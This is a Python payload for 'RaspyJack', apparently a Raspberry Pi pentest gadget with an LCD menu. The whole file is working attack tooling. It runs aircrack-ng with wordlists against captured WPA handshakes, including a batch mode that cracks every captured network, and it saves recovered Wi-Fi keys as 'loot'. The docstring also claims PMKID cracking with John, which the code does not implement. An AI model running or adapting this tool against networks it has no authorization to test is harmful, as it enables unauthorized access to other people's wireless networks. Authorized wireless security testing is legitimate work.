#!/usr/bin/env python3
"""
RaspyJack Payload -- WPA/WPA2 Cracker
======================================
Author: 7h30th3r0n3

Cracks WPA handshakes (.cap) using aircrack-ng and PMKID hashes
using John the Ripper. Scans loot directories for crack targets.

Setup / Prerequisites:
  - Requires aircrack-ng for .cap handshake files.
  - Requires john for PMKID hash cracking.
  - Optional wordlists: /root/Raspyjack/loot/wordlists/rockyou.txt,
    custom.txt

Controls:
  OK         -- Select file / start cracking
  UP / DOWN  -- Scroll file list / wordlists
  KEY1       -- Stop current crack
  KEY2       -- Export cracked results to loot
  KEY3       -- Exit (kills cracking process)

Loot: /root/Raspyjack/loot/CrackedWPA/
"""

import os
import sys
import re
import time
import signal
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
AIRCRACK_BIN = "/usr/bin/aircrack-ng"
WORDLIST_DIR = "/root/Raspyjack/loot/wordlists"
SYSTEM_WORDLIST = "/usr/share/john/password.lst"
HANDSHAKE_DIRS = [
    "/root/Raspyjack/loot/Handshakes",
    "/root/Raspyjack/loot/Pwnagotchi/handshakes",
    "/root/Raspyjack/loot/ESPNow/handshakes",
]
LOOT_DIR = "/root/Raspyjack/loot/CrackedWPA"
ROWS_VISIBLE = 6
ROW_H = 12

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
target_files = []       # [{path, name, ftype, size_kb}]
wordlists = []          # [{name, path}] built dynamically
scroll_pos = 0
selected_idx = 0
phase = "files"         # files | network_select | wordlist | cracking | results | batch | batch_results
wl_idx = 0
status_msg = "Scanning for targets..."
cap_networks = []       # networks found in selected pcap
selected_bssid = None   # BSSID to crack (None = auto/single)
keys_tested = 0
speed_kps = ""
elapsed_secs = 0
found_key = ""
_running = True
_crack_proc = None
# Batch mode state
batch_mode = False
batch_results = []      # [{"file": ..., "essid": ..., "bssid": ..., "key": ... or None}]
batch_current = ""      # current target description
batch_progress = (0, 0) # (current_idx, total)


# ---------------------------------------------------------------------------
# Target file discovery
# ---------------------------------------------------------------------------

def _file_size_kb(filepath):
    """Return file size in KB."""
    try:
        return os.path.getsize(filepath) // 1024
    except Exception:
        return 0


def _scan_targets():
    """Scan for .cap/.pcap handshake files and PMKID hash files."""
    found = []
    seen = set()

    # Handshake .cap / .pcap files from all known directories
    for hs_dir in HANDSHAKE_DIRS:
        if not os.path.isdir(hs_dir):
            continue
        try:
            for fname in sorted(os.listdir(hs_dir)):
                fpath = os.path.join(hs_dir, fname)
                if not os.path.isfile(fpath):
                    continue
                low = fname.lower()
                if low.endswith(".cap") or low.endswith(".pcap"):
                    if fpath not in seen:
                        # Skip empty pcaps (header-only, 24 bytes)
                        try:
                            fsize = os.path.getsize(fpath)
                        except Exception:
                            fsize = 0
                        if fsize <= 24:
                            continue
                        seen.add(fpath)
                        found.append({
                            "path": fpath,
                            "name": fname,
                            "ftype": "CAP",
                            "size_kb": fsize // 1024,
                        })
        except Exception:
            pass

    return found


def _build_wordlist_options():
    """Build available wordlist options from loot/wordlists/ and system."""
    options = []

    # Scan project wordlists directory
    if os.path.isdir(WORDLIST_DIR):
        try:
            for fname in sorted(os.listdir(WORDLIST_DIR)):
                fpath = os.path.join(WORDLIST_DIR, fname)
                if not os.path.isfile(fpath):
                    continue
                low = fname.lower()
                if low.endswith(".txt") or low.endswith(".lst"):
                    name = os.path.splitext(fname)[0][:14]
                    options.append({"name": name, "path": fpath})
        except Exception:
            pass

    # System wordlist as fallback
    if os.path.isfile(SYSTEM_WORDLIST):
        options.append({"name": "john_default", "path": SYSTEM_WORDLIST})

    if not options:
        options.append({"name": "john_default", "path": SYSTEM_WORDLIST})
    return options


# ---------------------------------------------------------------------------
# Aircrack-ng output parsing
# ---------------------------------------------------------------------------

# Pattern: [00:01:23] 12345/67890 keys tested (2456.78 k/s)
_AIRCRACK_PROGRESS_RE = re.compile(
    r"\[\d+:\d+:\d+\]\s+([\d,]+)(?:/[\d,]+)?\s+keys?\s+tested\s+\(([^\)]+)\)"
)
# Pattern: KEY FOUND! [ password123 ]
_AIRCRACK_KEY_RE = re.compile(r"KEY FOUND!\s*\[\s*(.+?)\s*\]")


# ---------------------------------------------------------------------------
# Cracking threads
# ---------------------------------------------------------------------------

def _extract_essid_from_filename(fname):
    """Extract ESSID from capture filename.

    Filenames follow patterns like:
      hs_{essid}_{date}.pcap
      hs4_{essid}_{date}.pcap
      hs_half_{essid}_{date}.pcap
      pmkid_{essid}_{date}.pcap
    """
    base = os.path.splitext(os.path.basename(fname))[0]
    # Remove prefix (hs_, hs4_, hs_half_, pmkid_)
    for prefix in ("hs_half_", "hs4_", "hs_", "pmkid_"):
        if base.startswith(prefix):
            rest = base[len(prefix):]
            # Remove trailing _YYYYMMDD_HHMMSS
            parts = rest.rsplit("_", 2)
            if len(parts) >= 3 and len(parts[-1]) == 6 and len(parts[-2]) == 8:
                return "_".join(parts[:-2])
            if len(parts) >= 2 and len(parts[-1]) == 8:
                return "_".join(parts[:-1])
            return rest
    return ""


def _list_networks_in_cap(capfile):
    """List networks with valid handshakes in a pcap using aircrack-ng.

    Returns list of {"bssid": ..., "essid": ..., "enc": ..., "hs_count": ...}.
    Only includes networks with at least 1 handshake.
    """
    networks = []
    try:
        proc = subprocess.run(
            [AIRCRACK_BIN, capfile],
            capture_output=True, text=True, timeout=15,
            input="q\n",
        )
        # Strip ANSI escape codes from aircrack output
        _ansi = re.compile(r"\x1b\[[0-9;]*[a-zA-Z]")
        clean_output = _ansi.sub("", proc.stdout)
        # Parse aircrack-ng network listing lines
        net_re = re.compile(
            r"^\s*\d+\s+([0-9A-Fa-f:]{17})\s+(.+?)\s+(WPA|WEP|OPN)\s+\((\d+)\s+handshake",
        )
        for line in clean_output.splitlines():
            m = net_re.match(line)
            if m:
                hs_count = int(m.group(4))
                has_pmkid = "PMKID" in line
                # Keep if has handshake OR has PMKID
                if hs_count > 0 or has_pmkid:
                    networks.append({
                        "bssid": m.group(1),
                        "essid": m.group(2).strip(),
                        "enc": m.group(3),
                        "hs_count": hs_count,
                        "pmkid": has_pmkid,
                    })
    except Exception:
        pass
    return networks


def _crack_cap_thread(capfile, wordlist_path, bssid=None):
    """Crack a .cap handshake file using aircrack-ng."""
    global _crack_proc, keys_tested, speed_kps, elapsed_secs
    global found_key, phase, status_msg, _running

    start_time = time.time()
    with lock:
        keys_tested = 0
        speed_kps = ""
        elapsed_secs = 0
        found_key = ""
        status_msg = "Starting aircrack-ng..."

    cmd = [AIRCRACK_BIN, "-w", wordlist_path]
    if bssid:
        cmd += ["-b", bssid]
    cmd.append(capfile)

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        _crack_proc = proc

        while _running:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if not line:
                continue

            line = line.rstrip()
            with lock:
                elapsed_secs = int(time.time() - start_time)

            # Check for key found
            key_match = _AIRCRACK_KEY_RE.search(line)
            if key_match:
                with lock:
                    found_key = key_match.group(1)
                    status_msg = "KEY FOUND!"
                continue

            # Check for progress
            progress_match = _AIRCRACK_PROGRESS_RE.search(line)
            if progress_match:
                raw_keys = progress_match.group(1).replace(",", "")
                with lock:
                    try:
                        keys_tested = int(raw_keys)
                    except ValueError:
                        pass
                    speed_kps = progress_match.group(2).strip()
                    status_msg = "Cracking..."

        proc.wait(timeout=5)

    except Exception as exc:
        with lock:
            status_msg = f"Error: {str(exc)[:18]}"
    finally:
        _crack_proc = None
        with lock:
            elapsed_secs = int(time.time() - start_time)
            if phase == "cracking":
                phase = "results"
                if found_key:
                    status_msg = "KEY FOUND!"
                else:
                    status_msg = "Done. Key not found"



def _kill_crack_proc():
    """Kill the running cracking process."""
    global _crack_proc
    proc = _crack_proc
    if proc is not None:
        try:
            os.kill(proc.pid, signal.SIGTERM)
            proc.wait(timeout=5)
        except Exception:
            try:
                os.kill(proc.pid, signal.SIGKILL)
            except Exception:
                pass
        _crack_proc = None


# ---------------------------------------------------------------------------
# Batch crack (all files, all networks)
# ---------------------------------------------------------------------------

def _batch_crack_thread(wordlist_path, single_file=None):
    """Crack handshakes automatically, deduplicated by BSSID.

    If single_file is provided, only crack networks in that pcap.
    Otherwise, crack all pcap files.
    """
    global phase, batch_results, batch_current, batch_progress
    global keys_tested, speed_kps, elapsed_secs, found_key
    global _crack_proc, _running, status_msg

    results = []
    jobs = []
    seen_bssids = set()

    if single_file:
        file_list = [{"path": single_file, "name": os.path.basename(single_file), "ftype": "CAP"}]
    else:
        file_list = [tf for tf in target_files if tf["ftype"] == "CAP"]

    for tf in file_list:
        nets = _list_networks_in_cap(tf["path"])
        if not nets:
            continue
        for net in nets:
            if net["bssid"] in seen_bssids:
                continue
            seen_bssids.add(net["bssid"])
            jobs.append({
                "path": tf["path"],
                "name": tf["name"],
                "bssid": net["bssid"],
                "essid": net["essid"],
            })

    if not jobs:
        with lock:
            batch_current = "No valid targets"
            batch_progress = (0, 0)
            phase = "batch_results"
        return

    total = len(jobs)
    for idx, job in enumerate(jobs):
        if not _running:
            break

        with lock:
            batch_current = f"{job['essid'][:14]}"
            batch_progress = (idx + 1, total)
            keys_tested = 0
            speed_kps = ""
            elapsed_secs = 0
            found_key = ""
            status_msg = f"Batch {idx+1}/{total}"

        # Run aircrack-ng for this specific network
        start_time = time.time()
        cmd = [AIRCRACK_BIN, "-w", wordlist_path, "-b", job["bssid"], job["path"]]

        key_found = ""
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            _crack_proc = proc

            while _running:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break
                if not line:
                    continue
                line = line.rstrip()
                with lock:
                    elapsed_secs = int(time.time() - start_time)

                key_match = _AIRCRACK_KEY_RE.search(line)
                if key_match:
                    key_found = key_match.group(1)
                    break

                progress_match = _AIRCRACK_PROGRESS_RE.search(line)
                if progress_match:
                    raw_keys = progress_match.group(1).replace(",", "")
                    with lock:
                        try:
                            keys_tested = int(raw_keys)
                        except ValueError:
                            pass
                        speed_kps = progress_match.group(2).strip()

            proc.wait(timeout=5)
        except Exception:
            pass
        finally:
            _crack_proc = None

        results.append({
            "file": job["name"],
            "essid": job["essid"],
            "bssid": job["bssid"],
            "key": key_found or None,
        })

    with lock:
        batch_results = results
        phase = "batch_results"
        cracked = sum(1 for r in results if r["key"])
        status_msg = f"Done: {cracked}/{len(results)} cracked"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_result(target_name):
    """Export cracked WPA key to loot directory."""
    with lock:
        key = found_key
    if not key:
        return None

    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"cracked_{ts}.txt")
    with open(filepath, "w") as fh:
        fh.write(f"Target: {target_name}\n")
        fh.write(f"Key: {key}\n")
        fh.write(f"Date: {datetime.now().isoformat()}\n")
    return os.path.basename(filepath)


def _export_batch_results():
    """Export all batch cracking results to loot directory."""
    with lock:
        results = list(batch_results)
    cracked = [r for r in results if r["key"]]
    if not cracked:
        return None

    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"batch_{ts}.txt")
    with open(filepath, "w") as fh:
        fh.write(f"Batch Crack Results - {datetime.now().isoformat()}\n")
        fh.write(f"Total: {len(results)} | Cracked: {len(cracked)}\n")
        fh.write("-" * 40 + "\n")
        for r in results:
            status = r["key"] if r["key"] else "NOT FOUND"
            fh.write(f"{r['essid']} ({r['bssid']}): {status}\n")
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Drawing helpers
# ---------------------------------------------------------------------------

def _fmt_elapsed(secs):
    """Format seconds as MM:SS."""
    m, s = divmod(secs, 60)
    return f"{m:02d}:{s:02d}"


def _fmt_keys(count):
    """Format key count for display."""
    if count >= 1000000:
        return f"{count / 1000000:.1f}M"
    if count >= 1000:
        return f"{count / 1000:.1f}K"
    return str(count)


def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00AAFF")
    with lock:
        active = phase == "cracking"
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#444")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#888")


# ---------------------------------------------------------------------------
# View: file selection
# ---------------------------------------------------------------------------

def _draw_files_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "WPA CRACKER")

    with lock:
        msg = status_msg
        files = list(target_files)
        sc = scroll_pos
        sel = selected_idx

    d.text((2, 16), msg[:24], font=font, fill="#AAAAAA")
    d.text((2, 28), f"Targets: {len(files)}", font=font, fill="#888")

    if not files:
        d.text((8, 50), "No targets found", font=font, fill="#666")
        d.text((8, 64), "Capture handshakes", font=font, fill="#666")
        d.text((8, 78), "or grab PMKIDs first", font=font, fill="#666")
    else:
        visible = files[sc:sc + ROWS_VISIBLE]
        for i, tf in enumerate(visible):
            y = 40 + i * ROW_H
            idx = sc + i
            prefix = ">" if idx == sel else " "
            name = tf["name"][:14]
            color = "#00FF00" if idx == sel else "#CCCCCC"
            d.text((2, y), f"{prefix}{name}", font=font, fill=color)
            d.text((105, y), f"{tf['size_kb']}K", font=font, fill="#888")

    _draw_footer(d, "OK:Sel K1:CrackAll K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: network selection (multi-network pcaps)
# ---------------------------------------------------------------------------

def _draw_network_select_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "SELECT NETWORK")

    with lock:
        nets = list(cap_networks)
        sc = scroll_pos
        sel = selected_idx

    d.text((2, 16), f"{len(nets)} networks in pcap", font=font, fill="#888")

    # First entry is "All networks"
    items = [{"essid": "-- ALL --", "hs_count": sum(n["hs_count"] for n in nets), "_all": True}] + nets
    visible = items[sc:sc + ROWS_VISIBLE]
    for i, net in enumerate(visible):
        y = 30 + i * ROW_H
        idx = sc + i
        prefix = ">" if idx == sel else " "
        is_all = net.get("_all", False)
        if is_all:
            color = "#00CCFF" if idx == sel else "#0088AA"
        else:
            color = "#00FF00" if idx == sel else "#CCCCCC"
        essid = net["essid"][:11] or "Hidden"
        hs = net["hs_count"]
        pmkid = net.get("pmkid", False)
        tag = "P" if pmkid else f"{hs}hs"
        tag_color = "#FF44FF" if pmkid else "#FFAA00"
        d.text((2, y), f"{prefix}{essid}", font=font, fill=color)
        d.text((90, y), tag, font=font, fill=tag_color)

    _draw_footer(d, "OK:Select K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: wordlist selection
# ---------------------------------------------------------------------------

def _draw_wordlist_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "WORDLIST")

    with lock:
        sel = selected_idx
        sc = scroll_pos
        files = list(target_files)
        wl = list(wordlists)

    # Target info (compact, 1 line)
    if files and wl_idx < len(files):
        tf = files[wl_idx]
        d.text((2, 16), f"{tf['name'][:20]}", font=font, fill="#FFAA00")

    # Wordlist list with scroll
    list_y = 28
    wl_rows = 7
    visible = wl[sc:sc + wl_rows]
    for i, wl_entry in enumerate(visible):
        y = list_y + i * ROW_H
        idx = sc + i
        prefix = ">" if idx == sel else " "
        color = "#00FF00" if idx == sel else "#CCCCCC"
        # Show name + file size
        wl_path = wl_entry.get("path", "")
        try:
            sz = os.path.getsize(wl_path)
            if sz >= 1048576:
                sz_str = f"{sz / 1048576:.1f}M"
            elif sz >= 1024:
                sz_str = f"{sz // 1024}K"
            else:
                sz_str = f"{sz}B"
        except Exception:
            sz_str = ""
        d.text((2, y), f"{prefix}{wl_entry['name'][:16]}", font=font, fill=color)
        d.text((105, y), sz_str, font=font, fill="#666")

    # Scroll indicator
    if len(wl) > wl_rows:
        d.text((120, list_y), f"{sel + 1}/{len(wl)}", font=font, fill="#555")

    _draw_footer(d, "OK:Start U/D:Sel K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: cracking status
# ---------------------------------------------------------------------------

def _draw_cracking_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "WPA CRACKER")

    with lock:
        msg = status_msg
        tested = keys_tested
        spd = speed_kps
        elapsed = elapsed_secs
        key = found_key
        cur_phase = phase
        files = list(target_files)

    running = cur_phase == "cracking"

    # Target info
    if files and wl_idx < len(files):
        d.text((2, 16), f"{files[wl_idx]['name'][:22]}", font=font, fill="#888")

    # Status
    color = "#00FF00" if key else ("#FFAA00" if running else "#FF4444")
    d.text((2, 30), msg[:22], font=font, fill=color)

    # Stats
    d.text((2, 46), f"Time: {_fmt_elapsed(elapsed)}", font=font, fill="white")
    d.text((2, 58), f"Keys: {_fmt_keys(tested)}", font=font, fill="#AAAAAA")
    if spd:
        d.text((2, 70), f"Speed: {spd[:16]}", font=font, fill="#AAAAAA")

    # Found key (in green)
    if key:
        d.text((2, 86), "PASSWORD:", font=font, fill="#888")
        d.text((2, 98), key[:22], font=font, fill="#00FF00")

    if running:
        _draw_footer(d, "K1:Stop K3:Exit")
    else:
        _draw_footer(d, "K2:Export OK:Back K3:X")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# View: batch cracking progress
# ---------------------------------------------------------------------------

def _draw_batch_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "BATCH CRACK")

    with lock:
        cur = batch_current
        idx, total = batch_progress
        tested = keys_tested
        spd = speed_kps
        elapsed = elapsed_secs
        results = list(batch_results)
        msg = status_msg

    cracked = sum(1 for r in results if r["key"])

    # Progress
    d.text((2, 16), f"Target {idx}/{total}", font=font, fill="#FFAA00")
    d.text((2, 28), cur[:22], font=font, fill="#FFFFFF")

    # Stats
    d.text((2, 44), f"Time: {_fmt_elapsed(elapsed)}", font=font, fill="#AAAAAA")
    d.text((2, 56), f"Keys: {_fmt_keys(tested)}", font=font, fill="#AAAAAA")
    if spd:
        d.text((2, 68), f"Speed: {spd[:16]}", font=font, fill="#888")

    # Progress bar
    if total > 0:
        pct = idx / total
        d.rectangle((4, 82, 123, 89), outline="#444")
        bar_w = int(119 * pct)
        if bar_w > 0:
            d.rectangle((4, 82, 4 + bar_w, 89), fill="#00AAFF")
        d.text((50, 91), f"{int(pct * 100)}%", font=font, fill="#888")

    # Cracked count
    color = "#00FF00" if cracked > 0 else "#888"
    d.text((2, 102), f"Cracked: {cracked}/{len(results)}", font=font, fill=color)

    _draw_footer(d, "K1:Stop")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_batch_results_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "BATCH RESULTS")

    with lock:
        results = list(batch_results)
        sc = scroll_pos

    cracked = [r for r in results if r["key"]]
    d.text((2, 16), f"Cracked: {len(cracked)}/{len(results)}", font=font,
           fill="#00FF00" if cracked else "#FF4444")

    # Scrollable results list
    visible = results[sc:sc + ROWS_VISIBLE]
    for i, r in enumerate(visible):
        y = 30 + i * ROW_H
        essid = r["essid"][:10]
        if r["key"]:
            d.text((2, y), f"*{essid}", font=font, fill="#00FF00")
            d.text((68, y), r["key"][:10], font=font, fill="#FFAA00")
        else:
            d.text((2, y), f" {essid}", font=font, fill="#666")
            d.text((68, y), "no key", font=font, fill="#444")

    _draw_footer(d, "K2:Export OK:Back K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, phase, scroll_pos, selected_idx, wl_idx
    global status_msg, target_files, wordlists
    global cap_networks, selected_bssid
    global batch_mode, batch_results, batch_current, batch_progress

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((10, 16), "WPA CRACKER", font=font, fill="#00AAFF")
    d.text((4, 36), "aircrack-ng + john", font=font, fill="#888")
    d.text((4, 52), "Scanning for targets...", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)

    # Scan for targets and wordlists
    found = _scan_targets()
    wl_options = _build_wordlist_options()
    with lock:
        target_files = found
        wordlists = wl_options
        status_msg = f"Found {len(found)} targets" if found else "No targets found"

    selected_target = None

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if phase == "wordlist":
                    phase = "files"
                    batch_mode = False
                    with lock:
                        scroll_pos = 0
                        selected_idx = 0
                    time.sleep(0.25)
                    continue
                if phase == "network_select":
                    phase = "files"
                    with lock:
                        scroll_pos = 0
                        selected_idx = 0
                    time.sleep(0.25)
                    continue
                if phase == "batch_results":
                    phase = "files"
                    batch_mode = False
                    with lock:
                        scroll_pos = 0
                        selected_idx = 0
                    time.sleep(0.25)
                    continue
                # Exit
                break

            # --- File selection ---
            if phase == "files":
                if btn == "OK" and target_files:
                    with lock:
                        if 0 <= selected_idx < len(target_files):
                            selected_target = dict(target_files[selected_idx])
                            wl_idx = selected_idx
                    if selected_target:
                        with lock:
                            status_msg = "Analyzing pcap..."
                        _draw_files_view()
                        nets = _list_networks_in_cap(selected_target["path"])
                        with lock:
                            cap_networks = nets
                            selected_bssid = None
                        if len(nets) == 0:
                            with lock:
                                status_msg = "No valid handshake!"
                            time.sleep(1.5)
                            continue
                        if len(nets) > 1:
                            phase = "network_select"
                            with lock:
                                selected_idx = 0
                                scroll_pos = 0
                            time.sleep(0.3)
                            continue
                        elif len(nets) == 1:
                            with lock:
                                selected_bssid = nets[0]["bssid"]
                        phase = "wordlist"
                        with lock:
                            selected_idx = 0
                            scroll_pos = 0
                    time.sleep(0.3)

                elif btn == "KEY1" and target_files:
                    # Crack All -> go to wordlist selection in batch mode
                    batch_mode = True
                    selected_target = None  # None = all files
                    phase = "wordlist"
                    with lock:
                        selected_idx = 0
                        scroll_pos = 0
                    time.sleep(0.3)

                elif btn == "UP":
                    selected_idx = max(0, selected_idx - 1)
                    if selected_idx < scroll_pos:
                        with lock:
                            scroll_pos = selected_idx
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        total = len(target_files)
                    selected_idx = min(selected_idx + 1, max(0, total - 1))
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        with lock:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                    time.sleep(0.15)

                _draw_files_view()

            # --- Network selection (multi-network pcaps) ---
            elif phase == "network_select":
                if btn == "OK" and cap_networks:
                    # Index 0 = "ALL", index 1+ = individual networks
                    if selected_idx == 0:
                        # Crack all networks in this pcap -> batch mode on single file
                        batch_mode = True
                        # Override target_files temporarily to only this pcap
                        with lock:
                            selected_bssid = None
                        phase = "wordlist"
                        with lock:
                            selected_idx = 0
                            scroll_pos = 0
                    else:
                        net_idx = selected_idx - 1  # offset by "ALL" entry
                        with lock:
                            if 0 <= net_idx < len(cap_networks):
                                selected_bssid = cap_networks[net_idx]["bssid"]
                        phase = "wordlist"
                        with lock:
                            selected_idx = 0
                            scroll_pos = 0
                    time.sleep(0.3)

                elif btn == "UP":
                    selected_idx = max(0, selected_idx - 1)
                    if selected_idx < scroll_pos:
                        with lock:
                            scroll_pos = selected_idx
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        total = len(cap_networks) + 1  # +1 for "ALL" entry
                    selected_idx = min(selected_idx + 1, max(0, total - 1))
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        with lock:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                    time.sleep(0.15)

                _draw_network_select_view()

            # --- Wordlist selection ---
            elif phase == "wordlist":
                if btn == "OK":
                    with lock:
                        wl_entry = wordlists[selected_idx] if selected_idx < len(wordlists) else wordlists[0]

                    if batch_mode:
                        # Launch batch crack
                        phase = "batch"
                        # If came from network_select, crack only this pcap
                        single = selected_target["path"] if selected_target else None
                        with lock:
                            scroll_pos = 0
                            batch_results = []
                            batch_current = "Starting..."
                            batch_progress = (0, 0)
                        threading.Thread(
                            target=_batch_crack_thread,
                            args=(wl_entry["path"], single),
                            daemon=True,
                        ).start()
                        time.sleep(0.3)

                    elif selected_target:
                        phase = "cracking"
                        with lock:
                            scroll_pos = 0

                        threading.Thread(
                            target=_crack_cap_thread,
                            args=(selected_target["path"], wl_entry["path"], selected_bssid),
                            daemon=True,
                        ).start()
                        time.sleep(0.3)

                elif btn == "UP":
                    selected_idx = max(0, selected_idx - 1)
                    if selected_idx < scroll_pos:
                        with lock:
                            scroll_pos = selected_idx
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        total = len(wordlists)
                    selected_idx = min(selected_idx + 1, max(0, total - 1))
                    if selected_idx >= scroll_pos + 7:
                        with lock:
                            scroll_pos = selected_idx - 6
                    time.sleep(0.15)

                _draw_wordlist_view()

            # --- Cracking / results ---
            elif phase in ("cracking", "results"):
                if btn == "KEY1" and phase == "cracking":
                    _kill_crack_proc()
                    with lock:
                        status_msg = "Stopped by user"
                        phase = "results"
                    time.sleep(0.3)

                elif btn == "KEY2" and phase == "results":
                    target_name = selected_target["name"] if selected_target else "unknown"
                    fname = _export_result(target_name)
                    if fname:
                        with lock:
                            status_msg = f"Saved: {fname[:18]}"
                    else:
                        with lock:
                            status_msg = "No key to export"
                    time.sleep(0.3)

                elif btn == "OK" and phase == "results":
                    # Return to file selection
                    phase = "files"
                    with lock:
                        scroll_pos = 0
                        selected_idx = 0
                    found = _scan_targets()
                    with lock:
                        target_files = found
                        status_msg = f"Found {len(found)} targets"
                    time.sleep(0.3)

                _draw_cracking_view()

            # --- Batch cracking ---
            elif phase == "batch":
                if btn == "KEY1":
                    _kill_crack_proc()
                    with lock:
                        phase = "batch_results"
                        status_msg = "Stopped by user"
                    time.sleep(0.3)

                _draw_batch_view()

            # --- Batch results ---
            elif phase == "batch_results":
                if btn == "OK":
                    phase = "files"
                    batch_mode = False
                    with lock:
                        scroll_pos = 0
                        selected_idx = 0
                    found = _scan_targets()
                    with lock:
                        target_files = found
                        status_msg = f"Found {len(found)} targets"
                    time.sleep(0.3)

                elif btn == "KEY2":
                    fname = _export_batch_results()
                    if fname:
                        with lock:
                            status_msg = f"Saved: {fname[:18]}"
                    else:
                        with lock:
                            status_msg = "Nothing to export"
                    time.sleep(0.3)

                elif btn == "UP":
                    scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        total = len(batch_results)
                    scroll_pos = min(scroll_pos + 1, max(0, total - ROWS_VISIBLE))
                    time.sleep(0.15)

                _draw_batch_results_view()

            time.sleep(0.05)

    finally:
        _running = False
        _kill_crack_proc()
        time.sleep(0.3)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
